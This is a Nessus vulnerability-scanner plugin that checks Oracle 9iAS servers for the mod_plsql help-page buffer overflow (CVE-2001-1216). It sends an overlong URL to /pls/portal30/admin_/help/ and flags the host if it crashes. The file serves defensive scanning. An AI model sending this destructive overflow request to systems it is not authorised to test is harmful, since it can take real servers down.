#
# This script was written by Matt Moore <matt@westpoint.ltd.uk>
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (6/10/09)


include("compat.inc");

if(description)
{
 script_id(10840);
 script_version("$Revision: 1.22 $");
 script_cve_id("CVE-2001-1216");
 script_bugtraq_id(3726);
 script_xref(name:"OSVDB", value:"15386");

 script_name(english:"Oracle 9iAS mod_plsql Help Page Request Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"Oracle 9i Application Server uses Apache as it's web
server. There is a buffer overflow in the mod_plsql module
which allows an attacker to run arbitrary code." );
 script_set_attribute(attribute:"solution", value:
"Oracle have released a patch for this vulnerability, which
is available from:

http://metalink.oracle.com" );
 script_set_attribute(attribute:"see_also", value:"http://www.nextgenss.com/advisories/plsql.txt" );
 script_set_attribute(attribute:"see_also", value:"http://otn.oracle.com/deploy/security/pdf/modplsql.pdf" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_summary(english:"Oracle 9iAS mod_plsql Overflow");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Matt Moore");
 script_family(english:"Databases");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/OracleApache");
 exit(0);
}

#
# The script code starts here
# 

include("http_func.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc)
 {
# Send 215 chars at the end of the URL
  buf = http_get(item:string("/XXX/XXXXXXXX/XXXXXXX/XXXX/", crap(215)), port:port);
  send(socket:soc, data:buf);
  recv = http_recv(socket:soc);
  if ( ! recv ) exit(0);
  close(soc);

  soc = http_open_socket(port);
  if ( ! soc ) exit(0);
  
  buf = http_get(item:string("/pls/portal30/admin_/help/", crap(215)), port:port);
  send(socket:soc, data:buf);
 
 unbreakable = http_recv(socket:soc);
 if(!unbreakable)
	security_hole(port);
  
  } else {
   http_close_socket(soc);
  }
 }

